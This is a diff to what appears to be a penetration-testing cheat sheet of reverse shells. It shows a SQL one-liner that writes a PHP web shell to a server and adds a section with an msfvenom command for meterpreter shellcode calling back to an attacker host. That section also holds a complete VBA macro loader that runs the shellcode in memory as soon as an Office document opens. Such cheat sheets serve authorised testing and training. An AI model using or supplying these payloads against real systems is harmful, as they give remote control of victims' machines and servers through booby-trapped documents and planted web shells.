@@ -72,4 +72,42 @@ $sm.Write($st,0,$st.Length)}
 ## SQL & PHP reverse shell
 `select "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE "<php DOCUMENT_ROOT>/webshell.php"` then u can access the webshell by going `http://<url>/webshell.php?c=whoami`
 
+## VBA reverse shell
+1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f vbapplication`
+2. put this in your office document
+```
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+    
+    <paste output of 1 here>
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function 
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+
 Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)
